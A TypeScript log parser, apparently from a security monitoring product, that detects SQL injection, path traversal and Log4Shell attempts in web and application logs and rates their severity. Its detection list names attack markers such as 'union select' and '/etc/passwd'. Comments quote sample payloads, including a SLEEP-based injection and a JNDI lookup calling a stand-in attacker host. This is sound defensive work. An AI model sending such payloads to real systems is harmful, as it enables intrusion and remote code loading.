import { JSONObject } from "../../../Types/JSON";
import NormalizedSecurityEvent from "../../../Types/SecurityEvent/NormalizedSecurityEvent";
import OcsfSeverity from "../../../Types/SecurityEvent/OcsfSeverity";
import SecurityLogFormat from "../../../Types/SecurityEvent/SecurityLogFormat";
import SecurityEventRequestOutcome, {
  SECURITY_REQUEST_ATTRIBUTES,
} from "../../../Types/SecurityEvent/SecurityEventRequestOutcome";
import { readString } from "../NormalizerHelpers";
import { requestOutcomeFromStatusCode } from "../RequestOutcome";
import {
  MAX_JSON_LINE_LENGTH,
  MAX_TEXT_LINE_LENGTH,
  SecurityLogLine,
  buildLogSecurityEvent,
  cutText,
  readAttribute,
  readIpAddress,
  readWord,
} from "./SecurityLogLine";

/*
 * Attacks in a web server's access log - the requests the rule library's
 * web rules look for:
 *
 *   203.0.113.7 - - [19/Oct/2026:10:00:00 +0000] "GET /item?id=1%27%20or%201%3D1 HTTP/1.1" 200 512 "-" "sqlmap/1.7"
 *
 * A web server logs every request, so only a line that carries an attack
 * string becomes a security event: SQL injection, path traversal, or a
 * Log4Shell JNDI lookup (which an attacker also puts in headers, so it is
 * looked for in any log line, access log or not).
 *
 * Common and combined log format lines and JSON access logs (nginx,
 * Caddy, Envoy and the like) are read for the client address, the method,
 * the request target and the status; an application's own log line written
 * inside a request is read for the same from its OpenTelemetry attributes.
 * The request target is the event's target resource, which the rules match
 * on. A line with no request in it - an application's "Page not found -
 * /x?id=1' or 1=1" error, JSON and stack trace and all - keeps the word that
 * carries the attack there instead (readAttackPayload), so the rules still
 * see it and a person reads the request, not the stack.
 *
 * The message is a one-line summary of the attack and the request, and the
 * severity follows how far the request got (severityForWebAttack): a probe
 * the app turned away is Low, one that broke something is High. The status
 * a line records says that much; the request's trace says the rest
 * (Server/Utils/SecurityEvent/RequestTrace/SecurityRequestTrace.ts).
 */

export const WEB_HTTP_ACTIVITY_CLASS_UID: number = 4002;

// The attack a request carried (WebAttackKind), on every event this parser makes.
export const WEB_ATTACK_KIND_ATTRIBUTE: string = "web.attack.kind";

/*
 * The word that carries the attack, when the event's target does not hold
 * it - a JNDI lookup in a header of an access log line - so the message can
 * still say it after the request is followed.
 */
export const WEB_ATTACK_PAYLOAD_ATTRIBUTE: string = "web.attack.payload";

export enum WebAttackKind {
  SqlInjection = "sql-injection",
  PathTraversal = "path-traversal",
  Log4Shell = "log4shell",
}

/*
 * Matched lowercased, as written in requests: raw, and URL-encoded the way
 * a browser or a scanner sends them. The rule library's web rules carry
 * the same strings.
 */
export const WEB_ATTACK_MARKERS: ReadonlyArray<{
  kind: WebAttackKind;
  markers: ReadonlyArray<string>;
}> = [
  {
    kind: WebAttackKind.Log4Shell,
    markers: ["${jndi:", "%24%7bjndi"],
  },
  {
    kind: WebAttackKind.SqlInjection,
    markers: [
      "' or '1'='1",
      "' or 1=1",
      "%27%20or%201%3d1",
      "%27+or+1%3d1",
      "union select",
      "union all select",
      "union%20select",
      "union+select",
      "sleep(",
      "benchmark(",
      "information_schema",
    ],
  },
  {
    kind: WebAttackKind.PathTraversal,
    markers: ["../../", "..%2f", "%2e%2e%2f", "/etc/passwd"],
  },
];

// The attack a line carries, the first kind in the list's order.
export function readWebAttackKind(text: string): WebAttackKind | null {
  const lower: string = text.toLowerCase();

  for (const group of WEB_ATTACK_MARKERS) {
    for (const marker of group.markers) {
      if (lower.indexOf(marker) !== -1) {
        return group.kind;
      }
    }
  }

  return null;
}

export interface AccessLogRequest {
  clientIp: string;
  method: string;
  target: string;
  status: number;
  userAgent: string;
}

const HTTP_METHODS: ReadonlyArray<string> = [
  "GET",
  "POST",
  "PUT",
  "PATCH",
  "DELETE",
  "HEAD",
  "OPTIONS",
  "CONNECT",
  "TRACE",
];

function readStatus(value: string): number {
  if (value.length !== 3) {
    return 0;
  }

  const status: number = Number(value);

  return Number.isInteger(status) && status >= 100 && status <= 599
    ? status
    : 0;
}

/*
 * Common or combined log format: an address first, the request line in the
 * first quotes, the status after them and the user agent in the last.
 */
export function readCommonLogFormat(text: string): AccessLogRequest | null {
  const openQuote: number = text.indexOf('"');

  if (openQuote === -1) {
    return null;
  }

  const closeQuote: number = text.indexOf('"', openQuote + 1);

  if (closeQuote === -1) {
    return null;
  }

  const requestLine: string = text.slice(openQuote + 1, closeQuote);
  const firstSpace: number = requestLine.indexOf(" ");

  if (firstSpace === -1) {
    return null;
  }

  const method: string = requestLine.slice(0, firstSpace);

  if (!HTTP_METHODS.includes(method)) {
    return null;
  }

  const lastSpace: number = requestLine.lastIndexOf(" ");
  const target: string =
    lastSpace > firstSpace
      ? requestLine.slice(firstSpace + 1, lastSpace)
      : requestLine.slice(firstSpace + 1);

  /*
   * The address is the first word, or - behind a syslog prefix - the word
   * right before the " - " that common log format puts after it.
   */
  let clientIp: string = readIpAddress(readWord(text, 0));

  if (!clientIp) {
    const identityIndex: number = text.indexOf(" - ");

    if (identityIndex !== -1 && identityIndex < openQuote) {
      const before: string = text.slice(0, identityIndex);
      clientIp = readIpAddress(before.slice(before.lastIndexOf(" ") + 1));
    }
  }

  const status: number = readStatus(readWord(text, closeQuote + 2));

  // The user agent is the last quoted string of a combined format line.
  let userAgent: string = "";
  const lastQuote: number = text.lastIndexOf('"');

  if (lastQuote > closeQuote) {
    const agentStart: number = text.lastIndexOf('"', lastQuote - 1);

    if (agentStart > closeQuote) {
      userAgent = text.slice(agentStart + 1, lastQuote);
    }
  }

  return { clientIp, method, target, status, userAgent };
}

const JSON_CLIENT_FIELDS: Array<string> = [
  "remote_addr",
  "client_ip",
  "clientIp",
  "remoteAddr",
  "remote_ip",
  "client.address",
  "request.remote_ip",
  "ip",
];
const JSON_METHOD_FIELDS: Array<string> = [
  "method",
  "request_method",
  "http.request.method",
  "request.method",
];
const JSON_TARGET_FIELDS: Array<string> = [
  "request_uri",
  "uri",
  "url",
  "path",
  "url.original",
  "request.uri",
  "request",
];
const JSON_STATUS_FIELDS: Array<string> = [
  "status",
  "status_code",
  "http.response.status_code",
  "response.status",
];
const JSON_AGENT_FIELDS: Array<string> = [
  "http_user_agent",
  "user_agent",
  "userAgent",
  "user_agent.original",
  "request.headers.User-Agent",
];

function readFirstField(record: JSONObject, fields: Array<string>): string {
  for (const field of fields) {
    const value: string = readString(record, field);

    if (value) {
      return value;
    }
  }

  return "";
}

// A JSON access log line (nginx log_format escape=json, Caddy, Envoy).
export function readJsonAccessLog(text: string): AccessLogRequest | null {
  if (!text.startsWith("{") || text.length > MAX_JSON_LINE_LENGTH) {
    return null;
  }

  let parsed: unknown;

  try {
    parsed = JSON.parse(text);
  } catch {
    return null;
  }

  if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) {
    return null;
  }

  const record: JSONObject = parsed as JSONObject;
  let target: string = readFirstField(record, JSON_TARGET_FIELDS);
  let method: string = readFirstField(record, JSON_METHOD_FIELDS).toUpperCase();

  // nginx's $request is the whole request line: "GET /path HTTP/1.1".
  const firstSpace: number = target.indexOf(" ");

  if (firstSpace !== -1 && HTTP_METHODS.includes(target.slice(0, firstSpace))) {
    method = method || target.slice(0, firstSpace);
    const lastSpace: number = target.lastIndexOf(" ");
    target =
      lastSpace > firstSpace
        ? target.slice(firstSpace + 1, lastSpace)
        : target.slice(firstSpace + 1);
  }

  if (!target) {
    return null;
  }

  return {
    clientIp: readIpAddress(readFirstField(record, JSON_CLIENT_FIELDS)),
    method: HTTP_METHODS.includes(method) ? method : "",
    target,
    status: readStatus(readFirstField(record, JSON_STATUS_FIELDS)),
    userAgent: readFirstField(record, JSON_AGENT_FIELDS),
  };
}

// The first word of a line that is an IP address, for lines in no known format.
function findFirstIpAddress(text: string): string {
  let start: number = 0;
  let checked: number = 0;

  while (start < text.length && checked < 64) {
    const end: number = text.indexOf(" ", start);
    const word: string =
      end === -1 ? text.slice(start) : text.slice(start, end);
    const ip: string = readIpAddress(word);

    if (ip) {
      return ip;
    }

    if (end === -1) {
      break;
    }

    start = end + 1;
    checked++;
  }

  return "";
}

/*
 * What a person reads first: the attack, said plainly. The same words open
 * the event's message and name it wherever it is listed.
 */
export const WEB_ATTACK_LABELS: Record<WebAttackKind, string> = {
  [WebAttackKind.SqlInjection]: "SQL injection attempt",
  [WebAttackKind.PathTraversal]: "Path traversal attempt",
  [WebAttackKind.Log4Shell]: "Log4Shell exploit attempt",
};

export function isWebAttackKind(value: unknown): value is WebAttackKind {
  return (
    typeof value === "string" &&
    (Object.values(WebAttackKind) as Array<string>).includes(value)
  );
}

// The SQL injection markers, lowercased: what a query holding the payload holds.
export function getSqlInjectionMarkers(): Array<string> {
  const group: { markers: ReadonlyArray<string> } | undefined =
    WEB_ATTACK_MARKERS.find((item: { kind: WebAttackKind }): boolean => {
      return item.kind === WebAttackKind.SqlInjection;
    });

  return (group?.markers || [])
    .filter((marker: string): boolean => {
      // Encoded markers are how a URL carries SQL, never how a query does.
      return marker.indexOf("%") === -1 && marker.indexOf("+") === -1;
    })
    .map((marker: string): string => {
      return marker.toLowerCase();
    });
}

/*
 * The request as the line's own attributes describe it - OpenTelemetry's
 * names, and the older ones instrumentation still writes: what an
 * application's log line carries when it was written inside a request.
 */
export function readRequestFromAttributes(
  attributes: JSONObject,
): AccessLogRequest {
  const url: string =
    readAttribute(attributes, ["url.full", "http.url", "url.original"]) ||
    readAttribute(attributes, ["url.path", "http.target"]);
  const query: string = readAttribute(attributes, ["url.query"]);

  return {
    clientIp: readIpAddress(
      readAttribute(attributes, [
        "client.address",
        "http.client_ip",
        "net.peer.ip",
        "network.peer.address",
        "source.address",
      ]),
    ),
    method: readAttribute(attributes, ["http.request.method", "http.method"])
      .trim()
      .toUpperCase(),
    target:
      url && query && url.indexOf("?") === -1 && url.indexOf("://") === -1
        ? `${url}?${query}`
        : url,
    status: readStatus(
      readAttribute(attributes, [
        "http.response.status_code",
        "http.status_code",
      ]),
    ),
    userAgent: readAttribute(attributes, [
      "user_agent.original",
      "http.user_agent",
    ]),
  };
}

// The longest stretch of text a payload is read across, either side of its marker.
export const MAX_PAYLOAD_REACH: number = 2000;

/*
 * Characters a payload never runs across: a request target or a header
 * value ends at a space or a double quote (a single quote is part of SQL).
 */
function endsPayload(character: string): boolean {
  return (
    character === " " ||
    character === "\t" ||
    character === "\n" ||
    character === "\r" ||
    character === '"' ||
    character === "<" ||
    character === ">" ||
    character === "`"
  );
}

/*
 * The word around the first marker of `kind` in `text`: the request target,
 * header value or parameter that carries the attack - say
 * "/sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)" out of an
 * application's "Page not found - /sitemap.xml?..." error. A word quoted
 * in single quotes ("Failed to decode param '/%c0%ae/etc/passwd'") is read
 * without them. '' when no marker of the kind is there.
 */
export function readAttackPayload(text: string, kind: WebAttackKind): string {
  const lower: string = text.toLowerCase();
  const group: { markers: ReadonlyArray<string> } | undefined =
    WEB_ATTACK_MARKERS.find((item: { kind: WebAttackKind }): boolean => {
      return item.kind === kind;
    });

  let markerStart: number = -1;
  let markerEnd: number = -1;

  for (const marker of group?.markers || []) {
    const index: number = lower.indexOf(marker);

    if (index !== -1 && (markerStart === -1 || index < markerStart)) {
      markerStart = index;
      markerEnd = index + marker.length;
    }
  }

  if (markerStart === -1) {
    return "";
  }

  let start: number = markerStart;

  while (
    start > 0 &&
    markerStart - start < MAX_PAYLOAD_REACH &&
    !endsPayload(text[start - 1]!)
  ) {
    start--;
  }

  let end: number = markerEnd;

  while (
    end < text.length &&
    end - markerEnd < MAX_PAYLOAD_REACH &&
    !endsPayload(text[end]!)
  ) {
    end++;
  }

  let payload: string = text.slice(start, end);

  if (
    payload.length > 2 &&
    payload.startsWith("'") &&
    payload.endsWith("'") &&
    markerStart > start
  ) {
    payload = payload.slice(1, -1);
  }

  return payload;
}

// The message fields an application's JSON log line says what happened in.
const JSON_MESSAGE_FIELDS: Array<string> = [
  "message",
  "msg",
  "error.message",
  "err.message",
  "error",
];

/*
 * The payload, read from where it is most likely a request: the message of
 * an application's JSON log line (its stack repeats it, among frames), and
 * else anywhere in the line.
 */
function readPayload(text: string, kind: WebAttackKind): string {
  if (text.startsWith("{") && text.length <= MAX_JSON_LINE_LENGTH) {
    let parsed: unknown = null;

    try {
      parsed = JSON.parse(text);
    } catch {
      parsed = null;
    }

    if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
      for (const field of JSON_MESSAGE_FIELDS) {
        const value: string = readString(parsed as JSONObject, field);
        const payload: string = value ? readAttackPayload(value, kind) : "";

        if (payload) {
          return payload;
        }
      }
    }
  }

  return readAttackPayload(text, kind);
}

function holdsAttackMarker(value: string): boolean {
  return Boolean(value) && readWebAttackKind(value) !== null;
}

// A request target as an address: a path or a full URL.
function isUrlLike(value: string): boolean {
  return (
    value.startsWith("/") ||
    value.startsWith("http://") ||
    value.startsWith("https://")
  );
}

// How long a target may be in a message before it is cut.
export const MAX_MESSAGE_TARGET_LENGTH: number = 400;

/*
 * An attack's one-line summary:
 *
 *   SQL injection attempt: GET /item?id=1%27%20or%201%3D1 → 200
 *   Log4Shell exploit attempt: GET / → 200 · ${jndi:ldap://attacker/a}
 *
 * The request as it arrived, so the rules that read a message for the
 * attack string still find it: when the target does not hold it, the
 * payload follows.
 */
export function buildWebAttackMessage(data: {
  kind: WebAttackKind;
  method?: string | undefined;
  target?: string | undefined;
  statusCode?: number | undefined;
  payload?: string | undefined;
}): string {
  const target: string = cutText(
    (data.target || "").trim(),
    MAX_MESSAGE_TARGET_LENGTH,
  );
  const method: string = (data.method || "").trim().toUpperCase();
  const request: string = [method, target]
    .filter((part: string): boolean => {
      return Boolean(part);
    })
    .join(" ");

  let message: string = request
    ? `${WEB_ATTACK_LABELS[data.kind]}: ${request}`
    : WEB_ATTACK_LABELS[data.kind];

  if (data.statusCode) {
    message = `${message} → ${data.statusCode}`;
  }

  const payload: string = (data.payload || "").trim();

  if (payload && !holdsAttackMarker(target)) {
    message = `${message} · ${cutText(payload, MAX_MESSAGE_TARGET_LENGTH)}`;
  }

  return message;
}

/*
 * How serious an attack is, by what it is and how far it got. A probe the
 * app turned away is noise; one that reached a handler is worth a look;
 * one that broke something, or ran in the database, is somebody's
 * evening. Log4Shell is the exception: the lookup runs when a vulnerable
 * logger writes the string, whatever the app answered.
 */
export function severityForWebAttack(
  kind: WebAttackKind,
  outcome: SecurityEventRequestOutcome | undefined,
): OcsfSeverity {
  if (outcome === SecurityEventRequestOutcome.ReachedDatabase) {
    return OcsfSeverity.Critical;
  }

  if (kind === WebAttackKind.Log4Shell) {
    return OcsfSeverity.High;
  }

  switch (outcome) {
    case SecurityEventRequestOutcome.Rejected:
      return OcsfSeverity.Low;
    case SecurityEventRequestOutcome.Errored:
      return OcsfSeverity.High;
    default:
      return OcsfSeverity.Medium;
  }
}

export default class WebAttackLogParser {
  public static parse(line: SecurityLogLine): Array<NormalizedSecurityEvent> {
    const body: string = (line.body || "").trim();

    if (!body) {
      return [];
    }

    const text: string =
      body.length > MAX_TEXT_LINE_LENGTH
        ? body.slice(0, MAX_TEXT_LINE_LENGTH)
        : body;
    const kind: WebAttackKind | null = readWebAttackKind(text);

    if (!kind) {
      return [];
    }

    // The request: from an access log line, else from the line's attributes.
    const accessLog: AccessLogRequest | null =
      readJsonAccessLog(text) || readCommonLogFormat(text);
    const fromAttributes: AccessLogRequest = readRequestFromAttributes(
      line.attributes || {},
    );
    const payload: string = readPayload(text, kind);

    /*
     * The target is the request an access log line records, as it always
     * was - a JNDI lookup in its user agent leaves it the path it asked for.
     * A line with no request in it takes the URL its attributes name when
     * that carries the attack, and else the payload: so a rule that looks
     * for the attack string in the target (the rule library's do) finds it
     * there whenever the line holds no request saying otherwise.
     */
    const target: string = accessLog
      ? accessLog.target
      : holdsAttackMarker(fromAttributes.target)
        ? fromAttributes.target
        : payload || text;

    // The address asked for, when the line names one.
    const url: string =
      accessLog?.target ||
      fromAttributes.target ||
      (isUrlLike(target) ? target : "");

    const method: string = accessLog?.method || fromAttributes.method;
    const statusCode: number = accessLog?.status || fromAttributes.status;
    const userAgent: string = accessLog?.userAgent || fromAttributes.userAgent;
    const clientIp: string =
      accessLog?.clientIp || fromAttributes.clientIp || findFirstIpAddress(text);
    const outcome: SecurityEventRequestOutcome | undefined =
      requestOutcomeFromStatusCode(statusCode);

    const attributes: JSONObject = {
      [WEB_ATTACK_KIND_ATTRIBUTE]: kind,
    };

    // The attack, when what the message names as the request does not hold it.
    if (payload && !holdsAttackMarker(url || target)) {
      attributes[WEB_ATTACK_PAYLOAD_ATTRIBUTE] = cutText(payload, 1000);
    }

    if (method) {
      attributes[SECURITY_REQUEST_ATTRIBUTES.method] = method;
    }

    if (isUrlLike(url)) {
      attributes[SECURITY_REQUEST_ATTRIBUTES.url] = cutText(url, 2000);
    }

    if (statusCode) {
      attributes[SECURITY_REQUEST_ATTRIBUTES.statusCode] = String(statusCode);
    }

    if (userAgent) {
      attributes[SECURITY_REQUEST_ATTRIBUTES.userAgent] = cutText(
        userAgent,
        1000,
      );
    }

    let statusName: string = "";

    if (statusCode) {
      statusName = statusCode >= 400 ? "Failure" : "Success";
    }

    const event: NormalizedSecurityEvent = buildLogSecurityEvent({
      line,
      format: SecurityLogFormat.WebAttack,
      classUid: WEB_HTTP_ACTIVITY_CLASS_UID,
      activityName: method,
      statusName,
      severity: severityForWebAttack(kind, outcome),
      message: buildWebAttackMessage({
        kind,
        method,
        target: url || target,
        statusCode,
        payload,
      }),
      principalIp: clientIp,
      targetResource: cutText(target, 2000),
      attributes,
    });

    if (outcome) {
      event.requestOutcome = outcome;
    }

    return [event];
  }
}
